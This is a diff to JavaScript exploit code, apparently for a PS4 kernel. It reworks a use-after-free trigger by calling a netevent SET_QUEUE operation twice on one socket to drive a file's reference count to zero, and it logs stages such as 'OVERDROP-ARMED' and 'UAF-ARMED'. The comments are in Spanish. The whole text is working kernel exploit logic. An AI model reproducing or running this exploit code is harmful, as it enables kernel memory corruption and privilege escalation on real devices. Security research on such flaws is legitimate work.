@@ -881,12 +881,26 @@ let allDone = false;
             if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
             mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT + " dummy=" + dummy);
             
-            const reg = netevent(dummy, NETEVENT_SET_QUEUE);
-            if (reg.rv === -1) {
-                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
+            // ── SET_QUEUE #1: registra el socket en la cola ──
+            const reg1 = netevent(dummy, NETEVENT_SET_QUEUE);
+            if (reg1.rv !== 0) {
+                mark("ATTEMPT-SKIP", "SET1 rv=" + reg1.rv + " errno=" + reg1.err);
                 sc(SYS.close, dummy);
                 continue;
             }
+
+            // ── SET_QUEUE #2: duplicate path → fdrop → f_count 1→0 → file liberado ──
+            // El kernel devuelve rv=0 aunque el fdrop interno YA se haya ejecutado.
+            // NO comprobar errno==5. rv=0 es ÉXITO.
+            const reg2 = netevent(dummy, NETEVENT_SET_QUEUE);
+            mark("SET-2", "fd=" + dummy + " rv=" + reg2.rv
+                 + (reg2.rv === -1 ? " errno=" + reg2.err : ""));
+            if (reg2.rv !== 0) {
+                mark("ATTEMPT-SKIP", "SET2 rv=" + reg2.rv + " errno=" + reg2.err);
+                sc(SYS.close, dummy);
+                continue;
+            }
+            mark("OVERDROP-ARMED", "fd=" + dummy + " via=second-set f_count→0");
 
             sc(SYS.close, dummy);
             sc(SYS.setuid, 1);
@@ -900,10 +914,8 @@ let allDone = false;
             }
             
             sc(SYS.setuid, 1);
-            const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
-            mark("UAF-ARMED", "fd=" + uafSock 
-                 + " clear_rv=" + clr.rv + " clear_errno=" + clr.err);
             committed = true;
+            mark("UAF-ARMED", "fd=" + uafSock + " via=second-set");
 
             try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
             catch (e) { }
